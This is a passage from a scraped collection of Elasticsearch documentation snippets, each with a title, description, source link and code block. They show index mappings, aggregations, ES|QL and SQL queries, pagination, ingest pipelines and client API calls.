\"mappings\":{\n       \"properties\":{\n          \"title\": {\n             \"type\":\"text\",\n             \"analyzer\":\"my_analyzer\",\n             \"search_analyzer\":\"my_stop_analyzer\",\n             \"search_quote_analyzer\":\"my_analyzer\"\n         }\n      }\n   }\n}\n\nPUT my-index-000001/_doc/1\n{\n   \"title\":\"The Quick Brown Fox\"\n}\n\nPUT my-index-000001/_doc/2\n{\n   \"title\":\"A Quick Brown Fox\"\n}\n\nGET my-index-000001/_search\n{\n   \"query\":{\n      \"query_string\":{\n         \"query\":\"\\\"the quick brown fox\\\"\"\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Avg Aggregation Result in Elasticsearch\nDESCRIPTION: Shows the expected response format for an Avg aggregation, including the computed average value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-avg-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"avg_grade\": {\n      \"value\": 75.0\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Viewing Embeddings Response from Elasticsearch ML API\nDESCRIPTION: Example response from generating text embeddings, showing a vector representation of the input text. The embedding is a numerical representation that captures semantic meaning for use in vector search and other ML applications.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-api-services-storage-NOTICE.txt#2025-04-21_snippet_8\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"inference_results\": [\n    {\n      \"predicted_value\": [ 0.0072580635, 0.014516129, ... ]\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Field-based Sliced Scroll in Elasticsearch\nDESCRIPTION: Example of using a numeric field with doc_values for slicing instead of document IDs. This approach is more efficient for large datasets as it avoids the high memory cost associated with ID-based slicing when the number of slices exceeds the shard count.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/paginate-search-results.md#2025-04-21_snippet_16\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search?scroll=1m\n{\n  \"slice\": {\n    \"field\": \"@timestamp\",\n    \"id\": 0,\n    \"max\": 10\n  },\n  \"query\": {\n    \"match\": {\n      \"message\": \"foo\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Performing LOOKUP JOIN in ESQL\nDESCRIPTION: This ESQL query retrieves data from the 'app_logs' table and performs a lookup join with the 'service_owners' table using the 'service_id' field as the join condition. The LOOKUP JOIN is typically used for efficiency when joining with smaller, dimension-like tables.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs-lookup-join.csv-spec/lookupJoinServiceId.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM app_logs\n| LOOKUP JOIN service_owners ON service_id\n```\n\n----------------------------------------\n\nTITLE: Basic Histogram Aggregation in Elasticsearch\nDESCRIPTION: This example demonstrates how to use histogram aggregation to bucket products based on their price with an interval of 50. The aggregation dynamically builds fixed size buckets over numeric values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-histogram-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"prices\": {\n      \"histogram\": {\n        \"field\": \"price\",\n        \"interval\": 50\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"prices\": {\n      \"buckets\": [\n        {\n          \"key\": 0.0,\n          \"doc_count\": 1\n        },\n        {\n          \"key\": 50.0,\n          \"doc_count\": 1\n        },\n        {\n          \"key\": 100.0,\n          \"doc_count\": 0\n        },\n        {\n          \"key\": 150.0,\n          \"doc_count\": 2\n        },\n        {\n          \"key\": 200.0,\n          \"doc_count\": 3\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Search-as-you-type Mapping in Elasticsearch\nDESCRIPTION: Creates an index with a search_as_you_type field mapping. This configuration automatically creates multiple subfields with different analysis chains for efficient prefix and infix matching.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/search-as-you-type.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_field\": {\n        \"type\": \"search_as_you_type\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Global Aggregation with Sub-aggregations in Elasticsearch\nDESCRIPTION: This example demonstrates how to calculate an average price across all products (using global aggregation) while simultaneously calculating the average price for only t-shirts (filtered by query). The global aggregation ignores the query filter and includes all documents in the index.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-global-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"query\": {\n    \"match\": { \"type\": \"t-shirt\" }\n  },\n  \"aggs\": {\n    \"all_products\": {\n      \"global\": {}, <1>\n      \"aggs\": {     <2>\n      \"avg_price\": { \"avg\": { \"field\": \"price\" } }\n      }\n    },\n    \"t_shirts\": { \"avg\": { \"field\": \"price\" } }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Up Nested Index in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to set up an index with a nested field in Elasticsearch, which is necessary to use nested queries. It includes defining the field type as 'nested' in the index mappings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-nested-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"obj1\": {\n        \"type\": \"nested\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch IDs Query Example\nDESCRIPTION: This snippet demonstrates how to use the Elasticsearch IDs query to retrieve documents with specific IDs. The `values` parameter specifies an array of document IDs to search for. The query is executed against the `_search` endpoint.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-ids-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"ids\" : {\n      \"values\" : [\"1\", \"4\", \"100\"]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: NULL Predicate Examples in ESQL\nDESCRIPTION: Examples demonstrating how to use IS NULL and IS NOT NULL predicates for handling null values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/where.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nWHERE field IS NULL\n```\n\nLANGUAGE: esql\nCODE:\n```\nWHERE field IS NOT NULL\n```\n\n----------------------------------------\n\nTITLE: ESQL Aggregation with Metadata Fields\nDESCRIPTION: Demonstrates how to use metadata fields in aggregation queries, showing grouping by metadata field while calculating maximum value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-metadata-fields.md#2025-04-21_snippet_2\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees METADATA _index, _id\n| STATS max = MAX(emp_no) BY _index\n```\n\n----------------------------------------\n\nTITLE: Multiple Aggregations Query\nDESCRIPTION: Shows how to use multiple aggregate functions (MIN, MAX, AVG, COUNT) in a single query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_20\n\nLANGUAGE: sql\nCODE:\n```\nSELECT MIN(salary) AS min, MAX(salary) AS max, AVG(salary) AS avg, COUNT(*) AS count FROM emp;\n```\n\n----------------------------------------\n\nTITLE: Performing DateTime Arithmetic in ESQL\nDESCRIPTION: This ESQL query demonstrates datetime manipulation by adding and subtracting time durations. It uses type casting to convert strings to datetime and time_duration, and employs the EVAL clause for calculations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_timeduration.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW x = \"2024-01-01\"::datetime\n| EVAL y = x + \"3 hours\"::time_duration, z = x - TO_TIMEDURATION(\"3 hours\");\n```\n\n----------------------------------------\n\nTITLE: Querying, Aggregating, Sorting, and Scripting with _index Field in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the _index field in Elasticsearch for querying, aggregating, sorting, and scripting. It shows indexing documents into different indices and then performing a search that utilizes the _index field in various ways.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-index-field.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT index_1/_doc/1\n{\n  \"text\": \"Document in index 1\"\n}\n\nPUT index_2/_doc/2?refresh=true\n{\n  \"text\": \"Document in index 2\"\n}\n\nGET index_1,index_2/_search\n{\n  \"query\": {\n    \"terms\": {\n      \"_index\": [\"index_1\", \"index_2\"]\n    }\n  },\n  \"aggs\": {\n    \"indices\": {\n      \"terms\": {\n        \"field\": \"_index\",\n        \"size\": 10\n      }\n    }\n  },\n  \"sort\": [\n    {\n      \"_index\": {\n        \"order\": \"asc\"\n      }\n    }\n  ],\n  \"script_fields\": {\n    \"index_name\": {\n      \"script\": {\n        \"lang\": \"painless\",\n        \"source\": \"doc['_index']\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving a Document with Sequence Number in Elasticsearch\nDESCRIPTION: This snippet shows how to retrieve a document using the GET API. The response includes the current sequence number and primary term, which can be used for optimistic concurrency control in subsequent operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/optimistic-concurrency-control.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET products/_doc/1567\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"_index\": \"products\",\n  \"_id\": \"1567\",\n  \"_version\": 1,\n  \"_seq_no\": 362,\n  \"_primary_term\": 2,\n  \"found\": true,\n  \"_source\": {\n    \"product\": \"r2d2\",\n    \"details\": \"A resourceful astromech droid\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: SHOW TABLES with Mixed Pattern Matching\nDESCRIPTION: Demonstrates combining multiple and single character wildcards in pattern matching.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-show-tables.md#2025-04-21_snippet_6\n\nLANGUAGE: sql\nCODE:\n```\nSHOW TABLES LIKE '%em_';\n```\n\n----------------------------------------\n\nTITLE: Rollover Based on Primary Shard Size\nDESCRIPTION: ILM policy configuration that triggers rollover when the largest primary shard reaches 50GB in size.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-rollover.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT _ilm/policy/my_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"hot\": {\n        \"actions\": {\n          \"rollover\" : {\n            \"max_primary_shard_size\": \"50gb\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Match Phrase Query in Elasticsearch\nDESCRIPTION: Demonstrates a simple match phrase query searching for an exact phrase in the message field\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-match-query-phrase.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"match_phrase\": {\n      \"message\": \"this is a test\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Custom Country Database for IP Location Processor in Elasticsearch\nDESCRIPTION: This example shows how to configure the IP location processor to use a specific country database and store the result in a custom field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/ip-location-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT _ingest/pipeline/ip_location\n{\n  \"description\" : \"Add ip geolocation info\",\n  \"processors\" : [\n    {\n      \"ip_location\" : {\n        \"field\" : \"ip\",\n        \"target_field\" : \"geo\",\n        \"database_file\" : \"GeoLite2-Country.mmdb\"\n      }\n    }\n  ]\n}\nPUT my-index-000001/_doc/my_id?pipeline=ip_location\n{\n  \"ip\": \"89.160.20.128\"\n}\nGET my-index-000001/_doc/my_id\n```\n\n----------------------------------------\n\nTITLE: Updating Seat Prices with Painless Script in Elasticsearch Update by Query\nDESCRIPTION: This snippet demonstrates an update by query operation that finds unsold seats in specific rows and reduces their price by a parameterized discount amount. It uses a Painless script to modify the 'cost' field of matching documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-update-by-query-context.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPOST /seats/_update_by_query\n{\n  \"query\": {\n    \"bool\": {\n      \"filter\": [\n        {\n          \"range\": {\n            \"row\": {\n              \"lte\": 3\n            }\n          }\n        },\n        {\n          \"match\": {\n            \"sold\": false\n          }\n        }\n      ]\n    }\n  },\n  \"script\": {\n    \"source\": \"ctx._source.cost -= params.discount\",\n    \"lang\": \"painless\",\n    \"params\": {\n      \"discount\": 2\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring GeoPoint Mapping for IP Location Data\nDESCRIPTION: Creates an index mapping that explicitly defines the geoip.location field as a geo_point type to enable geographical queries and aggregations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/geoip-processor.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPUT my_ip_locations\n{\n  \"mappings\": {\n    \"properties\": {\n      \"geoip\": {\n        \"properties\": {\n          \"location\": { \"type\": \"geo_point\" }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Search with PIT and Explicit _shard_doc Tiebreaker in Elasticsearch\nDESCRIPTION: This example shows a search using a PIT with an explicit _shard_doc tiebreaker in descending order. The _shard_doc tiebreaker ensures consistent ordering when documents have the same timestamp value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/paginate-search-results.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"size\": 10000,\n  \"query\": {\n    \"match\" : {\n      \"user.id\" : \"elkbee\"\n    }\n  },\n  \"pit\": {\n    \"id\":  \"46ToAwMDaWR5BXV1aWQyKwZub2RlXzMAAAAAAAAAACoBYwADaWR4BXV1aWQxAgZub2RlXzEAAAAAAAAAAAEBYQADaWR5BXV1aWQyKgZub2RlXzIAAAAAAAAAAAwBYgACBXV1aWQyAAAFdXVpZDEAAQltYXRjaF9hbGw_gAAAAA==\", <1>\n    \"keep_alive\": \"1m\"\n  },\n  \"sort\": [ <2>\n    {\"@timestamp\": {\"order\": \"asc\", \"format\": \"strict_date_optional_time_nanos\"}},\n    {\"_shard_doc\": \"desc\"}\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Sorting Search Results with Multiple Fields in Elasticsearch\nDESCRIPTION: Demonstrates a search query with multiple sort fields, including date formatting, ascending and descending orders, and sorting by score.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/sort-search-results.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search\n{\n  \"sort\" : [\n    { \"post_date\" : {\"order\" : \"asc\", \"format\": \"strict_date_optional_time_nanos\"}},\n    { \"name\" : \"desc\" },\n    { \"age\" : \"desc\" },\n    \"user\",\n    \"_score\"\n  ],\n  \"query\" : {\n    \"term\" : { \"user\" : \"kimchy\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing a Document in Elasticsearch using Java API Client\nDESCRIPTION: This code demonstrates how to index a document in Elasticsearch using the Java API Client. It creates a product object and indexes it using the client's index method.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/ent-search/licenses/slf4j-api-NOTICE.txt#2025-04-22_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\nProduct product = new Product(\"bk-1\", \"City bike\", 123.0);\n\nIndexResponse response = client.index(i -> i\n    .index(\"products\")\n    .id(product.getSku())\n    .document(product)\n);\n```\n\n----------------------------------------\n\nTITLE: Field Name Search in Query String\nDESCRIPTION: Demonstrates various ways to search specific fields in Elasticsearch query syntax, including exact phrase matching, field wildcards, and field existence checking\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-query-string-query.md#2025-04-21_snippet_2\n\nLANGUAGE: elasticsearch\nCODE:\n```\nstatus:active\n```\n\nLANGUAGE: elasticsearch\nCODE:\n```\ntitle:(quick OR brown)\n```\n\nLANGUAGE: elasticsearch\nCODE:\n```\nauthor:\"John Smith\"\n```\n\nLANGUAGE: elasticsearch\nCODE:\n```\nfirst\\ name:Alice\n```\n\nLANGUAGE: elasticsearch\nCODE:\n```\nbook.\\*:(quick OR brown)\n```\n\nLANGUAGE: elasticsearch\nCODE:\n```\n_exists_:title\n```\n\n----------------------------------------\n\nTITLE: Defining a Text Field with Keyword Multi-field in Elasticsearch Mapping\nDESCRIPTION: A JSON mapping example showing how to define a text field with a raw keyword multi-field. This pattern is commonly used in Elasticsearch to support both full-text search and exact value operations like sorting and filtering.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-data-types.md#2025-04-21_snippet_0\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"first_name\": {\n    \"type\": \"text\",\n    \"fields\": {\n      \"raw\": {\n        \"type\": \"keyword\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting REST API Compatibility Headers in HTTP Requests\nDESCRIPTION: Example of how to set the Accept and Content-Type headers to request REST API compatibility with Elasticsearch 8.x when making API calls to newer versions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/compatibility.md#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nAccept: \"application/vnd.elasticsearch+json;compatible-with=8\"\nContent-Type: \"application/vnd.elasticsearch+json;compatible-with=8\"\n```\n\n----------------------------------------\n\nTITLE: Querying Documents with Missing Fields in Elasticsearch\nDESCRIPTION: Example of using missing aggregation to find documents that don't have a value for a specific field. The query searches for products without a price field, returning the count in an aggregation bucket.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-missing-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"products_without_a_price\": {\n      \"missing\": { \"field\": \"price\" }\n    }\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"products_without_a_price\": {\n      \"doc_count\": 0\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Sum Using ESQL SUM Function\nDESCRIPTION: This ESQL query demonstrates the usage of the SUM function to calculate the total sum of the 'languages' field across all records in the 'employees' table. The STATS clause is used to perform the aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/sum.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS SUM(languages)\n```\n\n----------------------------------------\n\nTITLE: Displaying Supported Types for ESQL Comparison Operations in Markdown\nDESCRIPTION: This markdown table shows the supported data types for comparison operations in ESQL. It lists the left-hand side (lhs) type, right-hand side (rhs) type, and the resulting type for each valid comparison combination.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/types/less_than.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| lhs | rhs | result |\n| --- | --- | --- |\n| date | date | boolean |\n| date | date_nanos | boolean |\n| date_nanos | date | boolean |\n| date_nanos | date_nanos | boolean |\n| double | double | boolean |\n| double | integer | boolean |\n| double | long | boolean |\n| integer | double | boolean |\n| integer | integer | boolean |\n| integer | long | boolean |\n| ip | ip | boolean |\n| keyword | keyword | boolean |\n| keyword | text | boolean |\n| long | double | boolean |\n| long | integer | boolean |\n| long | long | boolean |\n| text | keyword | boolean |\n| text | text | boolean |\n| unsigned_long | unsigned_long | boolean |\n| version | version | boolean |\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Script Query with Runtime Fields\nDESCRIPTION: This snippet shows how to achieve the same result as the previous script query using runtime fields in Elasticsearch. It defines a runtime field 'amount.signed' that calculates a signed amount based on the document's 'amount' and 'type' fields, and then uses a range query to filter documents where 'amount.signed' is less than 10.  The `fields` parameter retrieves the calculated `amount.signed` value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-script-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"runtime_mappings\": {\n    \"amount.signed\": {\n      \"type\": \"double\",\n      \"script\": \"\"\"\n        double amount = doc['amount'].value;\n        if (doc['type'].value == 'expense') {\n          amount *= -1;\n        }\n        emit(amount);\n      \"\"\"\n    }\n  },\n  \"query\": {\n    \"bool\": {\n      \"filter\": {\n        \"range\": {\n          \"amount.signed\": { \"lt\": 10 }\n        }\n      }\n    }\n  },\n  \"fields\": [{\"field\": \"amount.signed\"}]\n}\n```\n\n----------------------------------------\n\nTITLE: Querying IPv4 Addresses Using CIDR Notation in Elasticsearch\nDESCRIPTION: This snippet shows how to perform a term query on an IP field using CIDR notation for IPv4 addresses.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/ip.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"term\": {\n      \"ip_addr\": \"192.168.0.0/16\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Computing Weighted Average by Languages using ESQL\nDESCRIPTION: Calculates the weighted average of employee salaries weighted by height, grouped by number of languages known. The query rounds the results, keeps only relevant columns, and sorts by the languages column. Returns a table with weighted averages and corresponding language counts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/weighted_avg.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS w_avg = WEIGHTED_AVG(salary, height) BY languages\n| EVAL w_avg = ROUND(w_avg)\n| KEEP w_avg, languages\n| SORT languages\n```\n\n----------------------------------------\n\nTITLE: GROUP BY with Column Name\nDESCRIPTION: Example of using GROUP BY with a column name to group results by gender, returning distinct gender values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_11\n\nLANGUAGE: sql\nCODE:\n```\nSELECT gender AS g FROM emp GROUP BY gender;\n```\n\n----------------------------------------\n\nTITLE: Creating a New Index from Source Index\nDESCRIPTION: This example shows the basic usage of the Create Index from Source API, creating a new index that inherits all settings and mappings from a source index without any modifications.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/create-index-from-source.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nPOST _create_from/my-index/my-new-index\n```\n\n----------------------------------------\n\nTITLE: Implementing Conditional Response Serialization for REST API Compatibility\nDESCRIPTION: Example Java code showing how to conditionally serialize fields in a response based on the requested API version, maintaining compatibility with version 7 while enabling new fields in version 8.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/REST_API_COMPATIBILITY.md#2025-04-21_snippet_3\n\nLANGUAGE: java\nCODE:\n```\n    if (builder.getRestApiVersion() == RestApiVersion.V_7) {\n        builder.field(\"limit\", max);\n    } else {\n        builder.field(\"maximum,\", max);\n        builder.field(\"minimum\", min);\n    }\n```\n\n----------------------------------------\n\nTITLE: Optimized Composite Aggregation with track_total_hits in Elasticsearch\nDESCRIPTION: This example demonstrates how to optimize early termination in composite aggregations by setting track_total_hits to false. This approach is recommended for efficient pagination of results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-composite-aggregation.md#2025-04-21_snippet_21\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"size\": 0,\n  \"track_total_hits\": false,\n  \"aggs\": {\n    \"my_buckets\": {\n      \"composite\": {\n        \"sources\": [\n          { \"user_name\": { \"terms\": { \"field\": \"user_name\" } } },\n          { \"date\": { \"date_histogram\": { \"field\": \"timestamp\", \"calendar_interval\": \"1d\", \"order\": \"desc\" } } }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing Stemmer Filter with Light German Algorithm in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create a custom stemmer filter that uses the light_german stemming algorithm and incorporates it into a custom analyzer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stemmer-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"my_stemmer\"\n          ]\n        }\n      },\n      \"filter\": {\n        \"my_stemmer\": {\n          \"type\": \"stemmer\",\n          \"language\": \"light_german\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating API Key for Connector\nDESCRIPTION: API call to generate a security API key with required permissions for the connector\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-dropbox.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /_security/api_key\n{\n  \"name\": \"connector_name-connector-api-key\",\n  \"role_descriptors\": {\n    \"connector_name-connector-role\": {\n      \"cluster\": [\n        \"monitor\",\n        \"manage_connector\"\n      ],\n      \"indices\": [\n        {\n          \"names\": [\n            \"index_name\",\n            \".search-acl-filter-index_name\",\n            \".elastic-connectors*\"\n          ],\n          \"privileges\": [\n            \"all\"\n          ],\n          \"allow_restricted_indices\": false\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Performing Lookup Join and Filtering in ESQL\nDESCRIPTION: This ESQL query retrieves employee data, performs a lookup join with a languages table, and filters the results based on employee numbers. It demonstrates the use of EVAL, LOOKUP JOIN, and WHERE clauses in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/lookup-join.csv-spec/filterOnRightSide.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| EVAL language_code = languages\n| LOOKUP JOIN languages_lookup ON language_code\n| WHERE emp_no >= 10091 AND emp_no < 10094\n```\n\n----------------------------------------\n\nTITLE: Foreach Processor with Failure Handling\nDESCRIPTION: Configuration of the Foreach processor with an on_failure block that redirects documents to a failure_index if the remove processor fails.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/foreach-processor.md#2025-04-21_snippet_11\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"foreach\" : {\n    \"field\" : \"persons\",\n    \"processor\" : {\n      \"remove\" : {\n        \"field\" : \"_value.id\",\n        \"on_failure\" : [\n          {\n            \"set\" : {\n              \"field\": \"_index\",\n              \"value\": \"failure_index\"\n            }\n          }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Joining Data Using LOOKUP JOIN in Elasticsearch ES|QL - esql\nDESCRIPTION: Demonstrates the syntax for performing a LOOKUP JOIN between a source index and a lookup index based on a common field in Elasticsearch ES|QL queries. Prerequisites: The lookup index must have 'lookup' index mode enabled and its name must be explicit (no wildcards or aliases). The join field must exist as a scalar (not multi-valued) in both indices. Input: Names of the source and lookup indices plus the join field name. Output: Extends each row of the source results with columns from matching documents in the lookup index. Multi-match rows are duplicated for each match; multi-valued fields in join criteria result in null output for added fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/lookup-join.md#_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM <source_index>\n| LOOKUP JOIN <lookup_index> ON <field_name>\n```\n\n----------------------------------------\n\nTITLE: Adding More Fields Dynamically to an Existing Elasticsearch Index\nDESCRIPTION: This snippet shows adding another document with additional new fields to an existing index. It introduces two new fields: 'email' and 'name.middle', which will be automatically added to the mapping.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/dynamic.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/2\n{\n  \"username\": \"marywhite\",\n  \"email\": \"mary@white.com\",\n  \"name\": {\n    \"first\": \"Mary\",\n    \"middle\": \"Alice\",\n    \"last\": \"White\"\n  }\n}\n\nGET my-index-000001/_mapping\n```\n\n----------------------------------------\n\nTITLE: Creating and Querying Index with date_nanos Field in Elasticsearch\nDESCRIPTION: Example of creating an index with a date_nanos field, inserting data, and querying it with various date formats and a runtime field to detect nanosecond precision.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/date_nanos.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"date\": {\n        \"type\": \"date_nanos\"\n      }\n    }\n 